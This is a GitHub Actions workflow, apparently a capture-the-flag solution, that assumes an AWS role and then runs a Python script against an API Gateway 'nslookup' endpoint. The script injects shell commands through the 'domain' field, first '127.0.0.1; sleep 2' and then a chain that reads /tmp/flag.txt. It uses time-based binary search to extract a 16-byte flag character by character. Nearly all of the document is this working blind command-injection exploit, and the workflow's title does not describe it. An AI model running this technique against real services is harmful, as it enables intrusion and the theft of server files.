name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Precision-Timing Side-Channel Extraction
        run: |
          python3 << 'PYEOF'
          import urllib.request
          import json
          import time
          import urllib.parse

          url = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"

          print("=== STEP 1: CALIBRATING TIMING BASELINE ===")
          start = time.time()
          req = urllib.request.Request(
              url,
              data=json.dumps({"domain": "127.0.0.1; sleep 2"}).encode('utf-8'),
              headers={'Content-Type': 'application/json'},
              method='POST'
          )
          try:
              with urllib.request.urlopen(req, timeout=10) as resp:
                  resp.read()
          except Exception:
              pass
          cal_time = time.time() - start
          print(f"Calibration sleep test took {cal_time:.2f} seconds.")

          flag_chars = []
          print("\n=== STEP 2: EXTRACTING FLAG (16 BYTES) WITH HIGH PRECISION ===")
          
          for pos in range(1, 17):
              low, high = 32, 126
              while low < high:
                  mid = (low + high) // 2
                  
                  # Lambda command: reads /tmp/flag.txt, gets char at pos, checks ASCII, sleeps 2 if > mid
                  lambda_cmd = (
                      f'127.0.0.1; '
                      f'F=$(cat /tmp/flag.txt 2>/dev/null); '
                      f'CHAR=$(echo "$F" | cut -c{pos}); '
                      f'ORD=$(echo -n "$CHAR" | od -An -tuC | xargs); '
                      f'if [ "$ORD" -gt {mid} ]; then sleep 2; fi'
                  )
                  
                  payload = json.dumps({"domain": lambda_cmd}).encode('utf-8')
                  req = urllib.request.Request(
                      url,
                      data=payload,
                      headers={'Content-Type': 'application/json'},
                      method='POST'
                  )
                  
                  start = time.time()
                  try:
                      with urllib.request.urlopen(req, timeout=10) as resp:
                          resp.read()
                  except Exception:
                      pass
                  duration = time.time() - start
                  
                  # Error margin: if request takes >= 1.3 seconds, the sleep successfully triggered (char > mid)
                  if duration >= 1.3:
                      low = mid + 1
                  else:
                      high = mid
                      
              char = chr(low)
              flag_chars.append(char)
              current_str = "".join(flag_chars)
              print(f"Position {pos} resolved to: '{char}' (ASCII {low}) | Flag so far: {current_str}")

          encoded_flag = "".join(flag_chars)
          print(f"\n===============================")
          print(f"FINAL ENCODED FLAG: {encoded_flag}")
          print(f"===============================")
          
          # Safely unquote the flag without quote-breaking syntax errors
          decoded_flag = urllib.parse.unquote(encoded_flag)
          print(f"FINAL PLAINTEXT FLAG: {decoded_flag}")
          PYEOF
